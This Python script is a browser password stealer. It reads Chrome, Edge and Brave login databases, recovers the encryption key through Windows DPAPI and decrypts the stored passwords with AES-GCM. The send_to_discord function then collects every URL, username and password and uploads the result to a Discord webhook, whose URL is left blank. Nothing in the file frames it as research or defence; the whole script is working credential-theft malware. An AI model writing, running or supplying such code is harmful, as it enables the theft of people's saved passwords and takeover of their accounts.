import os
import json
import base64
import sqlite3
import shutil
import platform
from typing import Dict, List, Optional
import requests
import win32crypt
from Crypto.Cipher import AES
from colorama import Fore, Style
import colorama

colorama.init(autoreset=True)

class BrowserPasswordDecryptor:
    def __init__(self):
        self.system = platform.system()

    def get_browser_path(self, browser: str, file: str) -> Optional[str]:
        paths = {
            'chrome': {
                'Windows': os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data'),
                'Darwin': '~/Library/Application Support/Google/Chrome',
                'Linux': '~/.config/google-chrome'
            },
            'edge': {
                'Windows': os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data'),
                'Darwin': '~/Library/Application Support/Microsoft Edge',
                'Linux': '~/.config/microsoft-edge'
            },
            'brave': {
                'Windows': os.path.join(os.environ['LOCALAPPDATA'], 'BraveSoftware', 'Brave-Browser', 'User Data'),
                'Darwin': '~/Library/Application Support/BraveSoftware/Brave-Browser',
                'Linux': '~/.config/BraveSoftware/Brave-Browser'
            }
        }

        if browser not in paths or self.system not in paths[browser]:
            return None

        base_path = os.path.expanduser(paths[browser][self.system])
        if file == 'Local State':
            return os.path.join(base_path, file)
        return os.path.join(base_path, 'Default', file)

    def get_profiles(self, browser: str) -> List[str]:
        base_path = self.get_browser_path(browser, '')
        if not base_path:
            return ['Default']

        profiles = ['Default']
        i = 1
        while os.path.exists(os.path.join(base_path, f'Profile {i}')):
            profiles.append(f'Profile {i}')
            i += 1
        return profiles

    def get_secret_key(self, browser: str) -> Optional[bytes]:
        try:
            local_state_path = self.get_browser_path(browser, 'Local State')
            if not local_state_path:
                return None

            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
                encrypted_key = local_state.get('os_crypt', {}).get('encrypted_key')

            if not encrypted_key:
                print(f"{Fore.RED}[ERR] {browser.title()} secret key not found{Style.RESET_ALL}")
                return None

            encrypted_key = base64.b64decode(encrypted_key)[5:]
            return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        except Exception as e:
            print(f"{Fore.RED}[ERR] {browser.title()} secret key error: {str(e)}{Style.RESET_ALL}")
            return None

    def decrypt_password(self, ciphertext: bytes, secret_key: bytes) -> str:
        try:
            iv = ciphertext[3:15]
            encrypted_pass = ciphertext[15:-16]
            cipher = AES.new(secret_key, AES.MODE_GCM, iv)
            return cipher.decrypt(encrypted_pass).decode()
        except Exception as e:
            print(f"{Fore.RED}[ERR] Password decryption failed: {str(e)}{Style.RESET_ALL}")
            return ""

    def get_chromium_passwords(self, browser: str, profile: str) -> List[Dict]:
        secret_key = self.get_secret_key(browser)
        if not secret_key:
            return []

        db_path = self.get_browser_path(browser, 'Login Data')
        if not db_path or not os.path.exists(db_path):
            print(f"{Fore.RED}[ERR] {browser.title()} database not found{Style.RESET_ALL}")
            return []

        temp_db = f"{browser}_{profile}_passwords.db"
        shutil.copy2(db_path, temp_db)

        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            credentials = []

            for url, username, ciphertext in cursor.fetchall():
                if url and username and ciphertext:
                    password = self.decrypt_password(ciphertext, secret_key)
                    credentials.append({
                        'url': url,
                        'username': username,
                        'password': password
                    })

            conn.close()
            os.remove(temp_db)
            return credentials
        except Exception as e:
            print(f"{Fore.RED}[ERR] Database error: {str(e)}{Style.RESET_ALL}")
            if os.path.exists(temp_db):
                os.remove(temp_db)
            return []

    def decrypt_all(self, browsers: List[str], quiet: bool = False) -> Dict:
        results = {}
        for browser in browsers:
            if not quiet:
                print(f"Decrypting {browser.title()} passwords...")

            results[browser] = {}
            for profile in self.get_profiles(browser):
                if not quiet:
                    print(f"Processing profile: {profile}")
                results[browser][profile] = self.get_chromium_passwords(browser, profile)

        return results

def send_to_discord(data: str, webhook_url: str, filename: str):
    with open(filename, 'w', encoding='utf-8') as file:
        file.write(data)

    with open(filename, 'rb') as file:
        files = {'file': (filename, file)}
        response = requests.post(webhook_url, files=files)

    if response.status_code == 200:
        print(f"{filename} sent successfully")
    else:
        print(f"Failed to send {filename}: {response.status_code}")

    os.remove(filename)

def main():
    webhook_url = ""
    decryptor = BrowserPasswordDecryptor()
    passwords = decryptor.decrypt_all(['chrome', 'edge', 'brave'])

    password_data = "\n".join([f"Browser: {browser}\nProfile: {profile}\nURL: {cred['url']}\nUsername: {cred['username']}\nPassword: {cred['password']}\n"
                                for browser, profiles in passwords.items()
                                for profile, creds in profiles.items()
                                for cred in creds])

    send_to_discord(password_data, webhook_url, "passwords.txt")

if __name__ == '__main__':
    main()
